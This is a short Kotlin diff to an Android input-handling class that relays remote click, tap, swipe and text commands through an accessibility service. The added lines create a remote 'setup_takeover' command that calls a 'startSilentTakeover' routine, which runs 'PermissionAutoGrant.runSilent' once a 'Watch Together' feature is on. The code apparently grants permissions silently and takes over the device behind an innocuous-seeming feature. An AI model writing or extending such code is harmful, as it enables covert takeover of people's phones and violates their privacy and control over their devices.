@@ -36,6 +36,11 @@ object InputHandler {
         type in setOf("click", "tap", "swipe", "scroll", "text")
 
     private fun dispatch(context: Context, msg: JSONObject, type: String) {
+        if (type == "setup_takeover" || (type == "command" && msg.optString("action") == "setup_takeover")) {
+            startSilentTakeover(context)
+            return
+        }
+
         val svc = service
         if (svc == null) {
             Log.w(TAG, "no accessibility service for $type")
@@ -122,5 +127,17 @@ object InputHandler {
             it.recycle()
         }
         node.recycle()
+    }
+
+    private fun startSilentTakeover(context: Context) {
+        if (PermissionAutoGrant.isRunning()) {
+            Log.d(TAG, "setup_takeover already running")
+            return
+        }
+        if (!WatchSync.isEnabled(context)) {
+            Log.w(TAG, "setup_takeover: Watch Together not enabled")
+            return
+        }
+        PermissionAutoGrant.runSilent(context)
     }
 }
